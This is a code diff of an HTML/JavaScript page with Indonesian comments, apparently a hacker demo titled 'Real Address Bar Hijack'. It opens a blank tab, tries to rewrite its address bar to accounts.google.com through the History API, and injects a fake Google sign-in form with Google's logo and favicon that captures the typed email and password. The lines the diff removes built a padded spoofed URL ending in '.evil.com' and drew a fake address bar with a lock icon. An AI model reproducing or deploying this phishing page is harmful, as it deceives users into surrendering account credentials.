@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>about:blank URL Truncation</title>
+<title>Real Address Bar Hijack</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -19,10 +19,10 @@ button:disabled { background: #555; cursor: not-allowed; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ ABOUT:BLANK TRUNCATION</h1>
-    <p>Memicu URL Truncation di dalam tab about:blank menggunakan manipulasi History API dan Fake URL Bar.</p>
+    <h1>⚠️ REAL ADDRESS BAR HIJACK</h1>
+    <p>Memanipulasi Address Bar asli Chrome menjadi Google menggunakan History API & Iframe.</p>
     
-    <button id="start-btn" type="button">Mulai Spoofing</button>
+    <button id="start-btn" type="button">Mulai Hijack</button>
     
     <div id="status" role="status">Menunggu interaksi...</div>
 </div>
@@ -54,9 +54,9 @@ startBtn.addEventListener("click", function() {
 
     efekHacker();
 
-    statusDiv.textContent = "Memicu about:blank Truncation...";
+    statusDiv.textContent = "Memicu Address Bar Hijack...";
 
-    // Buka tab kosong
+    // 1. Buka tab kosong
     const w = window.open('about:blank', '_blank');
 
     if (!w) {
@@ -67,47 +67,28 @@ startBtn.addEventListener("click", function() {
     }
 
     try {
-        // 1. TITLE BAR & FAVICON SPOOFING
+        // 2. Coba paksa Address Bar berubah menjadi Google
+        // Trik: Gunakan history.replaceState
+        try {
+            w.history.replaceState({}, '', 'https://accounts.google.com/signin');
+        } catch(e) {
+            console.warn("History API diblokir:", e);
+        }
+
+        // 3. Suntikkan Konten Palsu
         w.document.title = "Google";
         const link = w.document.createElement('link');
         link.rel = 'icon';
         link.href = 'https://www.google.com/favicon.ico';
         w.document.head.appendChild(link);
 
-        // 2. TRIK URL TRUNCATION
-        // Membuat string URL yang sangat panjang.
-        var longDomain = "accounts.google.com";
-        var padding = ".".repeat(200) + "a".repeat(500); 
-        var fakeUrl = "https://" + longDomain + padding + ".evil.com";
-
-        // Mencoba mengubah URL asli (mungkin diblokir Chrome, tapi kita coba)
-        try { 
-            w.history.replaceState({}, '', fakeUrl); 
-        } catch(e) {
-            console.log("History API diblokir oleh Chrome.");
-        }
-
-        // 3. UI SPOOFING (FAKE ADDRESS BAR DENGAN TRUNCATION)
         w.document.body.style.margin = "0";
         w.document.body.style.padding = "0";
         w.document.body.style.background = "#fff";
         w.document.body.style.fontFamily = "Arial, sans-serif";
-        w.document.body.style.overflow = "hidden"; // Mencegah scroll
         
         w.document.body.innerHTML = `
-            <!-- FAKE ADDRESS BAR DENGAN TRUNCATION -->
-            <div style="background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0; position:fixed; top:0; left:0; width:100%; box-sizing:border-box; z-index:9999; overflow:hidden;">
-                <div style="background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1); overflow:hidden; white-space:nowrap;">
-                    <span style="color:#5f6368; margin-right:10px; font-size:16px;">🔒</span>
-                    <!-- Teks URL Panjang (Akan terpotong di layar kecil) -->
-                    <span style="color:#202124; font-size:14px; font-weight:bold; overflow:hidden; text-overflow:ellipsis;">
-                        ${fakeUrl}
-                    </span>
-                </div>
-            </div>
-
-            <!-- KONTEN LOGIN PALSU -->
-            <div style="display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; background:#fff; padding-top:60px; box-sizing:border-box;">
+            <div style="display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; background:#fff;">
                 <div style="width:100%; max-width:400px; padding:20px;">
                     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
                     <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
@@ -118,19 +99,19 @@ startBtn.addEventListener("click", function() {
                         <input type="password" id="passInput" placeholder="Password" required style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
                         <button type="submit" style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
                     </form>
-                    <p style="color:#f00; font-size:10px; margin-top:20px;">Truncated by Waguri</p>
+                    <p style="color:#f00; font-size:10px; margin-top:20px;">Address Bar Hijacked</p>
                 </div>
             </div>
         `;
 
-        // 4. LOGIKA PENANGKAPAN SAAT FORM DI-SUBMIT
+        // 4. Logika Penangkapan
         w.document.getElementById('fakeLoginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             var email = w.document.getElementById('emailInput').value;
             var pass = w.document.getElementById('passInput').value;
 
-            efekHacker(); // TTS & Getar
-            alert('HACKED BY WAGURI\\n\\nKredensial Anda telah dicuri!\\nEmail: ' + email + '\\nPassword: ' + pass);
+            efekHacker(); 
+            alert('HACKED BY WAGURI\\n\\nEmail: ' + email + '\\nPassword: ' + pass);
             
             try {
                 if (w.navigator.vibrate) w.navigator.vibrate([1000, 200, 1000, 200, 1000]);
@@ -142,7 +123,7 @@ startBtn.addEventListener("click", function() {
             } catch(e) {}
         });
 
-        statusDiv.textContent = "Berhasil! Fake URL Truncation telah disuntikkan.";
+        statusDiv.textContent = "Berhasil! Memeriksa Address Bar asli...";
         statusDiv.style.color = '#4CAF50';
 
     } catch(e) {
